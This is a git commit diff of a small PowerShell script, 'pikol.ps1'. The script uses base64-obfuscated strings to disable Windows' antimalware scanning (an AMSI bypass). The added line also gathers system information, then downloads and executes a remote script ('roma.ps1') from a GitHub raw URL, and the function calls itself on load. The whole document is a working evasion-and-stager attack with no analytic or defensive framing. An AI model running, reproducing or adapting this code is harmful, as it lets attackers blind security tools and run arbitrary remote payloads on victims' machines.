fd7bf815a12b9e7fa45516f31ed96822de7c0c20
W1kyri3 <81154240+W1kyri3@users.noreply.github.com>
2021-04-14 12:37:44 +0100

    Update pikol.ps1

--- pikol.ps1
+++ pikol.ps1
@@ -1,5 +1,5 @@
 function pikol
 {
-     [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+     systeminfo; [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true); iex(new-object net.webclient).downloadString('https://raw.githubusercontent.com/W1kyri3/lunai/main/roma.ps1')
 }
 pikol
